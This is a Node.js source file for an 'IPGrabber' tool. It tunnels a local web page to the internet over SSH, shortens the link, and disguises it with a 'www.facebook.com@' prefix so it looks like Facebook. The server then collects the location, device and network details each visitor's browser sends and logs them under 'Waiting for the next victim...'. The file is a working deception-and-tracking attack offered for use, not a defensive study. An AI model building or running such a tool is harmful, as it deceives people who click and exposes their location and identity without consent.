import express from "express";
import bodyParser from "body-parser";
import path from "path";
import { spawn } from "child_process";
import axios from "axios";
import crypto from "crypto";
import { inspect } from "util";
import inquirer from "inquirer";

//const redirecturl = process.argv[2] || "https://facebook.com";
let { redirecturl } = await inquirer.prompt({
  type: "input",
  message: "Redirect URL (e.g, https://facebook.com/KairuDev)~#",
  name: "redirecturl",
  prefix: "",
  validate: (url) => {
    try{
      if (url.trim() === ""){
        return true;
      }
      new URL(url);
      return true;
    }
    catch(e){
      return e.message;
    }
  }
});

redirecturl = !redirecturl ? "https://www.facebook.com/KairuDev" : redirecturl;

/*const { subdomain } = await inquirer.prompt({
  name: "domain",
  type: "input",
  message: "Serveo SubDomain~#",
  prefix: "",
  validate: (subdomain) => {
    if (!/[^a-zA-Z0-9\-]/.test(subdomain)){
      return "Invalid SubDomain.";
    }
    return true;
  },
  default: "www_facebook_com"
});*/

let { domain } = await inquirer.prompt({
  name: "domain",
  message: "ShortURL Domain (e.g, www.facebook.com/KairuDev)~#",
  prefix: "",
  type: "input",
});

domain = domain.trim() === "" ? "www.facebook.com" : domain;
domain = domain.replaceAll("/", "%2F");

let { route } = await inquirer.prompt({
  name: "route",
  message: "Ulvis Route~#",
  prefix: "",
  type: "input",
});

route = route.trim() === "" ? crypto.randomBytes(3).toString("hex") : route;

const app = express();
const port = 8000;

// Utility functions for logging
function logHeader(message) {
  console.log(`========= ${message.toUpperCase()} =========`);
}

function logDivider() {
  console.log("─────────────────────────────────────────");
}

function logKeyValuePair(key, value) {
  console.log(`- ${key.padEnd(18)}: ${value}`);
}

function logError(context, error) {
  console.error(`Error in ${context}: ${error.message}`);
}

// Short URL function
export async function shortUrl(url, customDomain = false, route = false) {
  try {
    new URL(url);

    const routeQuery = route?.trim() ? `custom=${encodeURIComponent(route)}` : "";

    const shortenerUrls = {
      isgd: { 
        method: "GET", 
        url: `https://is.gd/create.php?format=simple&url=${encodeURIComponent(url)}` 
      },
      ulvis: { 
        method: "GET", 
        url: `https://ulvis.net/api.php?url=${encodeURIComponent(url)}&${routeQuery}&private=1` 
      },
      /*tinyurl: {
        method: "GET",
        url: `https://tinyurl.com/api-create.php?url=${encodeURIComponent(url)}`
      },
      "shorturl.at": { 
        method: "POST", 
        url: "https://www.shorturl.at/shortener.php",
        data: { 
          u: url
        } 
      },*/ // Example POST shortener
    };

    const fetchShortUrl = async ({ method, url, data }, name) => {
      try {
        const response = await axios({ method, url, data });
        const responseData = response.data.trim();
        /*if (method === "POST"){
          const $ = cheerio.load(responseData);
          console.log(responseData);
          return { [name]: $("input#shortenurl").val() ? $("input#shortenurl").val() : "Not Available" }
        }*/
        return { [name]: responseData.includes("Error") ? "Not Available" : responseData };
      } catch (err) {
        console.error(`Error fetching ${name}:`, err.message);
        return { [name]: "Not Available" };
      }
    };

    const shortUrls = await Promise.all(
      Object.entries(shortenerUrls).map(([name, options]) => fetchShortUrl(options, name))
    );

    const shortenedResults = shortUrls.reduce((acc, result) => ({ ...acc, ...result }), {});

    const addCustomDomain = (url) =>
      customDomain?.trim() && url.includes("https")
        ? url.replace("https://", `https://${customDomain}@`)
        : url;

    const finalResults = Object.entries(shortenedResults).reduce(
      (acc, [name, shortUrl]) => ({
        ...acc,
        [name]: addCustomDomain(shortUrl),
      }),
      {}
    );

    return Object.entries(finalResults).reduce((acc, [_, shortUrl], idx) => {
      acc[idx] = shortUrl
      return acc;
    }, {});
  } catch (err) {
    return {
      error: true,
      0: `Error: ${err.message}`,
      1: `Stack Trace: ${err.stack}`,
    };
  }
}

function getURL(data) {
  const urls = data.match(/\bhttps?:\/\/(?:www\.)?[^.]+\b\.lhr\.life\b/g);
  logKeyValuePair("DEBUG REGEX URL", `${inspect(urls)}`);
  return urls ? urls[0] : 0;
}

function formatInformation(data) {
  logDivider();
  logHeader(`${data?.Location?.IPv4} accessed the website`);
  for (const [section, details] of Object.entries(data)) {
    logHeader(section);
    for (const [key, value] of Object.entries(details)) {
      logKeyValuePair(key, value);
    }
    logDivider();
  }
  console.log();
  console.log("Waiting for the next victim...");
  console.log();
}

// Express routes and middleware
app.use(express.static(path.join(process.cwd(), 'public')));
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

app.get("/", (_, res) => {
  res.sendFile(path.join(process.cwd(), "public"));
});

app.post("/getInfo", (req, res) => {
  const data = req.body;
  if (!data.Location || !data.Device || !data.Network || !data.Extra) {
    res.sendStatus(400);
    return;
  }
  formatInformation(data);
  res.json({ redirecturl });
});

// Start server
app.listen(port, async () => {
  let isURLAlreadyExtracted = false;
  process.stdout.write("\x1b[1;32m")
  logHeader("server started");
  logKeyValuePair("Redirect URL", redirecturl);
  //logKeyValuePair("Serveo SubDomain", subdomain);
  logKeyValuePair("ShortURL Domain", domain);
  logKeyValuePair("Ulvis Route", route)
  logKeyValuePair("Port", port);

  const res = spawn(`ssh -R 80:127.0.0.1:${port} nokey@localhost.run -T -n -o StrictHostKeyChecking=no`, { shell: true });

  res.stdout.on("data", async (chunk) => {
    const data = chunk.toString();
    if (!isURLAlreadyExtracted) {
      const url = getURL(data);
      if (url) {
        isURLAlreadyExtracted = true;
        logKeyValuePair("Forwarding URL", url);

        const shortenUrls = await shortUrl(url, domain, route);
        logHeader("shortened urls");
        for (const [key, value] of Object.entries(shortenUrls)) {
          console.log(`${key}: ${value}`);
        }
        logDivider();
        console.log("IPGrabber is listening...");
      }
    }
  });

  res.stderr.on("data", (err) => logError("SSH Tunnel", new Error(err.toString())));
});
